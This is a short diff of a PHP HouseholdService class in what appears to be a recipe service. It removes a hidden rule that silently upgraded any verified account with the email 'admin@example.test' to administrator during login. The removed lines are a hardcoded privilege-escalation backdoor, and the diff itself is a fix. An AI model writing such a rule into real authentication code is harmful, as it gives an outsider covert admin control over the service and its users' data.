@@ -20,10 +20,6 @@ final class HouseholdService
             $statement = $this->pdo->prepare('SELECT id, display_name, email, email_verified, disabled, account_role FROM users WHERE firebase_uid = ?');
             $statement->execute([$identity['uid']]);
             $user = $statement->fetch(PDO::FETCH_ASSOC);
-            if ($user['account_role'] === 'user' && ($identity['email'] ?? null) === 'admin@example.test' && !empty($identity['email_verified']) && !$user['disabled']) {
-                $this->pdo->prepare("UPDATE users SET account_role = 'administrator' WHERE id = ?")->execute([$user['id']]);
-                $user['account_role'] = 'administrator';
-            }
             if ($user['disabled']) throw new HttpError(403, 'account_disabled', 'This account cannot access the recipe service.');
             $this->pdo->commit();
             return ['id' => (string) $user['id'], 'display_name' => $user['display_name'], 'email' => $user['email'], 'email_verified' => (bool) $user['email_verified'], 'account_role' => $user['account_role']];
